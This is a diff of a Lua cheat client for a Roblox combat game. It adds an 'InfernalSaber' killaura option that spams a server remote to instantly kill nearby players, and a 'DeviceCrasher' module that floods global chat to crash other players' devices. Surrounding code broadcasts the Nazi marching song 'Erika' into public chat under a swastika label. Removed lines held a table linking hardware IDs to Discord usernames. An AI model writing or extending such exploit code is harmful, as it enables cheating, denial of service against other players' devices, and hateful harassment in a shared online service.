 	end)
 
 	GuiLibrary.SelfDestructEvent.Event:Connect(function()
@@ -3566,7 +3609,7 @@ runcode(function()
 							FlyOverlap.FilterDescendantsInstances = {lplr.Character, gameCamera}
 							local allowed = true
 							for i,v in pairs(workspace:GetPartBoundsInRadius(newcf.p, 2, FlyOverlap)) do 
-								if (v.Position.Y + (v.Size.Y / 2)) > (newcf.p.Y + 0.1) then 
+								if (v.Position.Y + (v.Size.Y / 2)) > (newcf.p.Y + 0.5) then 
 									allowed = false
 									break
 								end
@@ -3724,6 +3767,31 @@ runcode(function()
 		New = {
 			{CFrame = CFrame.new(0.69, -0.77, 1.47) * CFrame.Angles(math.rad(-33), math.rad(57), math.rad(-81)), Time = 0.12},
 			{CFrame = CFrame.new(0.74, -0.92, 0.88) * CFrame.Angles(math.rad(147), math.rad(71), math.rad(53)), Time = 0.12}
+		},
+		["Funny"] = {
+			{CFrame = CFrame.new(-5, 	-2,   -2) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-0)), Time = 0.3},
+			{CFrame = CFrame.new(-1, 	-2,   -6) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-60)), Time = 0.3},
+			{CFrame = CFrame.new(2, 	-0,   -4) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-0)), Time = 0.3},
+			{CFrame = CFrame.new(0, 	 2,    1) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-0)), Time = 0.1}
+		},
+		["Jumpoah"] = {
+			{CFrame = CFrame.new(-3, -4, 1) * CFrame.Angles(math.rad(50), math.rad(69), math.rad(-40)), Time = 0.6},
+			{CFrame = CFrame.new(-2, -3, 0) * CFrame.Angles(math.rad(92), math.rad(56), math.rad(-94)), Time = 0.8},
+			{CFrame = CFrame.new(-2, -4, 3) * CFrame.Angles(math.rad(48), math.rad(28), math.rad(-58)), Time = 0.7}
+		},
+		["Cool"] = {
+			{CFrame = CFrame.new(0.20, 0.7, -0.6) * CFrame.Angles(math.rad(70), math.rad(20), math.rad(-20)), Time = 0.5},
+			{CFrame = CFrame.new(0.90, -0.14, 0.2) * CFrame.Angles(math.rad(-20), math.rad(-30), math.rad(-90)), Time = 0.15},
+			{CFrame = CFrame.new(0.12, -0.21, 0.69) * CFrame.Angles(math.rad(24), math.rad(-10), math.rad(38)), Time = 0.10},
+			{CFrame = CFrame.new(0.20, -0.11, 0.79) * CFrame.Angles(math.rad(-24), math.rad(69), math.rad(-69)), Time = 0.05},
+			{CFrame = CFrame.new(0.63, -0.1, 1.37) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.5}
+		},
+		["CoolV2"] = {
+			{CFrame = CFrame.new(0.39, 0.21, 0.20) * CFrame.Angles(math.rad(38), math.rad(-90), math.rad(-59)), Time = 0.15},
+			{CFrame = CFrame.new(0.10, -0.2, 0.22) * CFrame.Angles(math.rad(57), math.rad(83), math.rad(-10)), Time = 0.5},
+			{CFrame = CFrame.new(-0.32, -0.41, -0.26) * CFrame.Angles(math.rad(74), math.rad(-90), math.rad(-38)), Time = 0.10},
+			{CFrame = CFrame.new(0.46, -0.38, 0.19) * CFrame.Angles(math.rad(-89), math.rad(42), math.rad(-42)), Time = 0.15},
+			{CFrame = CFrame.new(-0.23, -0.31, 2.87) * CFrame.Angles(math.rad(74), math.rad(-29), math.rad(68)), Time = 0.5}
 		},
 		["Vertical Spin"] = {
 			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(-90), math.rad(8), math.rad(5)), Time = 0.1},
@@ -4004,9 +4072,31 @@ runcode(function()
 						end
 					until (not Killaura.Enabled)
 				end)
+				if killaurainfernalsaber.Enabled then
+					if not getItem("infernal_saber") then
+						createwarning("Killaura", "You do not have infernal saber.", 5)
+						return
+					end
+					RunLoops:BindToHeartbeat("InfernalSaberExploit", function()
+						task.wait()
+						if killauraNearPlayer then
+							local args = {[1] = {chargeTime = 0.49999999999999998}}		  
+							game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.HellBladeRelease:FireServer(unpack(args))
+							local args = {[1] = {chargeTime = 0.49999999999999998}}		  
+							game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.HellBladeRelease:FireServer(unpack(args))
+							local args = {[1] = {chargeTime = 0.49999999999999998}}		  
+							game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.HellBladeRelease:FireServer(unpack(args))
+							local args = {[1] = {chargeTime = 0.49999999999999998}}		  
+							game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.HellBladeRelease:FireServer(unpack(args))
+							local args = {[1] = {chargeTime = 0.49999999999999998}}		  
+							game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.HellBladeRelease:FireServer(unpack(args))
+						end
+					end)
+				end
             else
 				vapeTargetInfo.Targets.Killaura = nil
-				RunLoops:UnbindFromHeartbeat("Killaura") 
+				RunLoops:UnbindFromHeartbeat("Killaura")
+				RunLoops:UnbindFromHeartbeat("InfernalSaberExploit")
                 killauraNearPlayer = false
 				for i,v in pairs(killauraboxes) do v.Adornee = nil end
 				if killauraaimcirclepart then killauraaimcirclepart.Parent = nil end
@@ -4069,7 +4159,7 @@ runcode(function()
     })
     killauraanimmethod = Killaura.CreateDropdown({
         Name = "Animation", 
-        List = {"Normal", "Slow", "New", "Vertical Spin", "Exhibition", "Exhibition Old"},
+		List = {"Normal", "Slow", "New", "Cool", "Funny", "CoolV2", "Jumpoah", "Vertical Spin", "Exhibition", "Exhibition Old"},
         Function = function(val) end
     })
 	local oldviewmodel
@@ -4116,6 +4206,11 @@ runcode(function()
 		end,
 		Default = true
 	})
+	killaurainfernalsaber = Killaura.CreateToggle({
+        Name = "InfernalSaber",
+        Function = function() end,
+		HoverText = "Spams the infernal spin to instakill."
+    })
     killauramouse = Killaura.CreateToggle({
         Name = "Require mouse down",
         Function = function() end,
@@ -6393,7 +6488,6 @@ runcode(function()
 		List = {"Old", "Winter", "Halloween", "Valentines"}
 	})
 end)
-
 
 runcode(function()
 	local oldkilleffect
@@ -10206,54 +10300,6 @@ runcode(function()
 		Priority = 2
 	})
 end)
-runcode(function()
-	infernalexploitexploit = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
-		Name = "InfernalSaberExploit",
-		Function = function(callback)
-			if callback then
-				RunLoops:BindToHeartbeat("InfernalSaberExploit", function()
-					task.wait()
-						local args = {[1] = {chargeTime = 0.49999999999999998}}		  
-						game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.HellBladeRelease:FireServer(unpack(args))
-						local args = {[1] = {chargeTime = 0.49999999999999998}}		  
-						game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.HellBladeRelease:FireServer(unpack(args))
-						local args = {[1] = {chargeTime = 0.49999999999999998}}		  
-						game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.HellBladeRelease:FireServer(unpack(args))
-						local args = {[1] = {chargeTime = 0.49999999999999998}}		  
-						game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.HellBladeRelease:FireServer(unpack(args))
-						local args = {[1] = {chargeTime = 0.49999999999999998}}		  
-						game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.HellBladeRelease:FireServer(unpack(args))
-					end)
-				else
-			RunLoops:UnbindFromHeartbeat("InfernalSaberExploit")
-		end
-	end
-})
-end)
-
-runcode(function()
-	inventorysize = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
-		["Name"] = "InventorySizer",
-		["Function"] = function(callback)
-			if callback then
-				RunLoops:BindToHeartbeat("sizeloop", function()
-				game:GetService("Players").LocalPlayer.PlayerGui.hotbar["1"]["4"].Size = UDim2.new(1, 0, sizechanger["Value"], 0)
-			end)
-		else
-			RunLoops:UnbindFromHeartbeat("sizeloop")
-			game:GetService("Players").LocalPlayer.PlayerGui.hotbar["1"]["4"].Size = UDim2.new(1, 0, 1, 0)
-		end
-	end
-})
-sizechanger = inventorysize.CreateSlider({
-	Name = "Size",
-	Function = function() end,
-	Min = 1,
-	Max = 1,
-	Double = 1,
-	Default = 0.9,
-})
-end)
 
 runcode(function()
 	local SkyTPPos = {Value = 500}
@@ -10354,7 +10400,7 @@ Function = function(callback)
 			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("In der Heimat weint um dich ein Mägdelein" ,"All")
 			wait(3)
 			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("und das heißt: Erika!" ,"All")
-			createwarning("Germany 卐", "Finished", 4)
+			createwarning("Germany 卐", "Finished German version", 4)
 		else
 			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("On the heath, there blooms a little flower" ,"All")
 			wait(3)
@@ -10404,16 +10450,37 @@ Function = function(callback)
 			wait(3)
 			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("and she's called : Erika!" ,"All")
 			createwarning("Germany 卐", "Finished English version", 4)
-		end
-	end
-end,
-})
-language = germany.CreateDropdown({
-Name = "Language",
-List = {"German", "English"},
-Function = function() end
-})
+				end
+			end
+		end,
+	})
+	language = germany.CreateDropdown({
+		Name = "Language",
+		List = {"German", "English"},
+		Function = function() end
+	})
 end)
+
+runcode(function()
+	DeviceCrasher = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
+		   Name = "DeviceCrasher",
+			Function = function(callback)
+				if callback then
+					spawn(function() 
+						repeat task.wait()
+							for i = 1,1000 do
+								if not DeviceCrasher.Enabled then return end
+								game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Get crashed" ,"All")
+							end
+						until not DeviceCrasher.Enabled
+					end)
+					wait(0.5)
+					DeviceCrasher["ToggleButton"](false)
+				end
+			end,
+			HoverText = "Simple method."
+		})
+	end)
 
 runcode(function()
 	local verylessepicval =  {["Value"] = 5}
@@ -10421,17 +10488,15 @@ runcode(function()
 	local epicval =  {["Value"] = 10000}
 	local tweenfly = {["Enabled"] = false}
 	tweenfly = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
-		   ["Name"] = "TweenFly",
-			["Function"] = function(callback)
+		   Name = "TweenFly",
+			Function = function(callback)
 				if callback then
-					workspace.Gravity = 0
 					local TS = game:GetService("TweenService")
 					local Prim = game.Players.LocalPlayer.Character.PrimaryPart.CFrame
 					local tween = TS:Create(game.Players.LocalPlayer.Character.PrimaryPart, TweenInfo.new(lessepicval["Value"]), {CFrame = Prim + Prim.lookVector * epicval["Value"]})
 					tween:play()
 					wait(verylessepicval["Value"])
 					tween:Pause()
-					workspace.Gravity = 192.6
 					tweenfly["ToggleButton"](false)
 				end
 			end,
@@ -10518,7 +10583,7 @@ runcode(function()
 						game:GetService("Players").LocalPlayer.PlayerGui.TopBarAppGui.TopBarApp["3"].Visible = false
 					end
 					if removehostpanel.Enabled then
-						if not game:GetService("Players").LocalPlayer.PlayerGui.TopBarAppGui.TopBarApp:GetChildren()[7] then createwarning("FrameRemover","Cannot Find HostPanel", 5) return end
+						if not game:GetService("Players").LocalPlayer.PlayerGui.TopBarAppGui.TopBarApp:GetChildren()[7] then createwarning("FrameRemover", "Cannot Find HostPanel", 5) return end
 						game:GetService("Players").LocalPlayer.PlayerGui.TopBarAppGui.TopBarApp:GetChildren()[7].Visible = false
 					end
 					if removeemote.Enabled then
@@ -10616,7 +10681,7 @@ end)
 			Function = function(callback)
 				if callback then
 					task.spawn(function()
-					RunLoops:BindToHeartbeat("RunLoopsThing", function()
+					RunLoops:BindToHeartbeat("Inventory", function()
 					game:GetService("Players").LocalPlayer.PlayerGui.hotbar["1"]:GetChildren()[5].Visible = false
 					wait()
 					game:GetService("Players").LocalPlayer.PlayerGui.hotbar["1"]["4"]["2"]["1"]["1"].Visible = false
@@ -10676,17 +10741,23 @@ end)
 					UICorner10.Parent = game:GetService("Players").LocalPlayer.PlayerGui.hotbar["1"]["4"]["10"]["1"]
 				end)
 			end)
-			RunLoops:BindToHeartbeat("armorrightside", function()
+			RunLoops:BindToHeartbeat("InventoryTogg", function()
 				if rightsidearmoricon.Enabled then
 					game:GetService("Players").LocalPlayer.PlayerGui.hotbar["1"]["3"].Position = UDim2.new(1.16, 0, 1, 0)
 				end
 				if not rightsidearmoricon.Enabled then
 					game:GetService("Players").LocalPlayer.PlayerGui.hotbar["1"]["3"].Position = UDim2.new(-0.1, 0, 1, 0)
 				end
+				if inventorysizertogg.Enabled then
+					game:GetService("Players").LocalPlayer.PlayerGui.hotbar["1"]["4"].Size = UDim2.new(1, 0, inventorysize["Value"], 0)
+				end
+				if not inventorysizertogg.Enabled then
+					game:GetService("Players").LocalPlayer.PlayerGui.hotbar["1"]["4"].Size = UDim2.new(1, 0, 1, 0)
+				end
 			end)
 		else
-			RunLoops:UnbindFromHeartbeat("RunLoopsThing")
-			RunLoops:UnbindFromHeartbeat("armorrightside")
+			RunLoops:UnbindFromHeartbeat("Inventory")
+			RunLoops:UnbindFromHeartbeat("InventoryTogg")
 			game:GetService("Players").LocalPlayer.PlayerGui.hotbar["1"]:GetChildren()[5].Visible = true
 			wait()
 			game:GetService("Players").LocalPlayer.PlayerGui.hotbar["1"]["4"]["2"]["1"]["1"].Visible = true
@@ -10710,6 +10781,8 @@ end)
 			game:GetService("Players").LocalPlayer.PlayerGui.hotbar["1"]["4"]["11"].Visible = true
 			wait()
 			game:GetService("Players").LocalPlayer.PlayerGui.hotbar["1"]["3"].Position = UDim2.new(-0.1, 0, 1, 0)
+			wait()
+			game:GetService("Players").LocalPlayer.PlayerGui.hotbar["1"]["4"].Size = UDim2.new(1, 0, 1, 0)
 		end
 	end,
   HoverText = "Makes Your Hotbar Look Better",
@@ -10717,74 +10790,18 @@ end)
 rightsidearmoricon = customhotbar.CreateToggle({
 	Name = "Right Side Armor Icon",
 	Function = function(callback) end,
-	Default = false
 })
-end)
-
-runcode(function()
-local clone
-local bypassing = false
-local blink = {["Enabled"] = false}
-blink = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
-	Name = "Blink",
-	Function = function(callback)
-		if callback then
-			bypassing = true
-			lplr.Character.Archivable = true
-			clone = lplr.Character:Clone()
-			clone.Parent = workspace
-			clone.Name = "blink"
-			workspace.Camera.CameraSubject = clone.Humanoid
-			game:GetService("Players").LocalPlayer.Character = clone
-			lplr.Character = clone
-			game.Players.LocalPlayer.Character = clone
-			clone.Animate.Disabled = true
-			repeat
-				wait()
-				clone.Animate.Disabled = false
-				if not bypassing then return end
-				if not bypassing then return end
-				workspace[lplr.Name].HumanoidRootPart.CFrame = clone.HumanoidRootPart.CFrame
-				for i,v in pairs(workspace[lplr.Name]:GetChildren()) do
-					if v:IsA("BasePart") then
-						v.Transparency = 1
-					end
-					if v:IsA("Accessory") then
-						v.Handle.Transparency = 1
-					end
-					if v.Name == "Head" then
-						v.face.Transparency = 1
-					end
-					if v.Name == "HumanoidRootPart" then
-						v.Transparency = 100
-					end
-				end
-				if not bypassing then return end
-			until not bypassing
-		else
-			bypassing = true
-			task.wait()
-			for i,v in pairs(workspace[lplr.Name]:GetChildren()) do
-				if v:IsA("BasePart") then
-					v.Transparency = 0
-				end
-				if v:IsA("Accessory") then
-					v.Handle.Transparency = 0
-				end
-				if v.Name == "Head" then
-					v.face.Transparency = 0
-				end
-				if v.Name == "HumanoidRootPart" then
-					v.Transparency = 100
-				end
-			end
-			game:GetService("Players").LocalPlayer.Character = workspace[lplr.Name]
-			lplr.Character = workspace[lplr.Name]
-			game.Players.LocalPlayer.Character = workspace[lplr.Name]
-			clone:Destroy()
-			workspace.Camera.CameraSubject = lplr.Character.Humanoid
-		end
-	end,
+inventorysizertogg = customhotbar.CreateToggle({
+	Name = "Inventory Sizer",
+	Function = function(callback) end,
+})
+inventorysize = customhotbar.CreateSlider({
+	Name = "Size",
+	Function = function() end,
+	Min = 1,
+	Max = 1,
+	Double = 1,
+	Default = 0.9,
 })
 end)
 
@@ -11281,25 +11298,28 @@ runcode(function()
 									end
 									for i, v in pairs(lplr.Character:GetChildren()) do
 										if not SingleTexture.Enabled then
-											if v.Name:find('wood') then
+											v.Handle.MeshId = "rbxassetid://" .. texturepackMesh[string.split(v.Name, "_")[1]][1]
+											v.Handle.TextureID = "rbxassetid://" .. texturepackMesh[string.split(v.Name, "_")[1]][2]
+											elseif SingleTexture.Enabled then
+											if Texture.Value == "wood" then
 												v.Handle.Size = v.Handle.Size * 0.8
 												v.Handle.MeshId = "rbxassetid://13156260367"
 												v.Handle.TextureID = "rbxassetid://13156264394"
-
-											elseif v.Name:find('stone') then
+	
+											elseif Texture.Value == "stone" then
 												v.Handle.Size = v.Handle.Size * 0.8
 												v.Handle.MeshId = "rbxassetid://13156535067" v.Handle.TextureID = "rbxassetid://13156533518"
 
-											elseif v.Name:find('iron') then
+											elseif Texture.Value == "iron" then
 												v.Handle.Size = v.Handle.Size * 0.8
 												v.Handle.MeshId = "rbxassetid://13156652510" v.Handle.TextureID = "rbxassetid://13156654736"
 
-											elseif v.Name:find('diamond') then
+											elseif Texture.Value == "diamond" then
 												v.Handle:FindFirstChild("gem"):Destroy()
 												v.Handle.Size = v.Handle.Size * 0.8
 												v.Handle.MeshId = "rbxassetid://13156798963" v.Handle.TextureID = "rbxassetid://13156800982"
 
-											elseif v.Name:find('emerald') then
+											elseif Texture.Value == "emerald" then
 												v.Handle:FindFirstChild("Neon"):Destroy()
 												v.Handle.Size = v.Handle.Size * 2.2
 												v.Handle.MeshId = "rbxassetid://13160122132" v.Handle.TextureID = "rbxassetid://13160122773"
@@ -11320,7 +11340,7 @@ runcode(function()
 		Name = "Single Texture",
 		Function = function() end,
 		Default = false,
-		HoverText = "Only uses one texture for every sword.(Only works in first person for now)"
+		HoverText = "Only uses one texture for every sword."
 	})
 	Texture = texturepack.CreateDropdown({
 		Name = "Texture",
@@ -11377,12 +11397,10 @@ runcode(function()
 
 											elseif v.Name:find('diamond') then
 												v.Handle.Size = v.Handle.Size * 1
-												v.Handle:FindFirstChild("gem"):Destroy()
 												v.Handle.MeshId = "rbxassetid://13045611120" v.Handle.TextureID = "rbxassetid://13045612849"
 
 											elseif v.Name:find('emerald') then
 												v.Handle.Size = v.Handle.Size * 3.16
-												v.Handle:FindFirstChild("Neon"):Destroy()
 												v.Handle.MeshId = "rbxassetid://13052515751" v.Handle.TextureID = "rbxassetid://13052517600"
 											end											
 										end
@@ -11441,17 +11459,17 @@ end)
 				end,
 				["HoverText"] = "You need discord and a server to use it."
 			})
-Webhook2 = logs.CreateTextBox({
-	["Name"] = "WebHook",
-	["TempText"] = "Your discord webhook",
-	["FocusLost"] = function(enter) end
-})
-PingUser2 = logs.CreateTextBox({
-	["Name"] = "ID",
-	["TempText"] = "UserID",
-	["FocusLost"] = function(enter) end
-})
-end)
+			Webhook2 = logs.CreateTextBox({
+				["Name"] = "WebHook",
+				["TempText"] = "Your discord webhook",
+				["FocusLost"] = function(enter) end
+			})
+			PingUser2 = logs.CreateTextBox({
+				["Name"] = "ID",
+				["TempText"] = "UserID",
+				["FocusLost"] = function(enter) end
+			})
+		end)
 
 task.spawn(function()
 	local function createannouncement(announcetab)
@@ -11586,19 +11604,11 @@ task.spawn(function()
 		end)
 	end)
 end)
-local informationwarning =
-{
-	["1e7374ce-7770-450a-a944-527fbaac94e6"] = "very tuff cat#4499",
-	["2f98df94-b2c0-458f-8214-06f9b88a3c76"] = "102.902#3052",
-	["E2D6C78C-9D6D-4444-B24E-A81C1063DA0D"] = "whathedogdoin#3461",
-	["2B7E4926-420F-446C-96BD-7BC5C6AC57F2"] = "vyx#1368",
-}
-for hwid, name in pairs(informationwarning) do
-	 if game:GetService("RbxAnalyticsService"):GetClientId() == hwid then
-			createwarning("Information", "Discord User: "..name..", Roblox username: " ..lplr.Name.."", 20)
+else
+	for i, v in pairs(Blacklist) do
+		if not game:GetService("RbxAnalyticsService"):GetClientId() == i and not Whitelist[game:GetService("RbxAnalyticsService"):GetClientId()] then
+			GuiLibrary.SelfDestruct()
+			game.Players.LocalPlayer:Kick("You are not Whitelisted")
 		end
 	end
-else
-	GuiLibrary.SelfDestruct()
-	game.Players.LocalPlayer:Kick("You are not Whitelisted")
 end
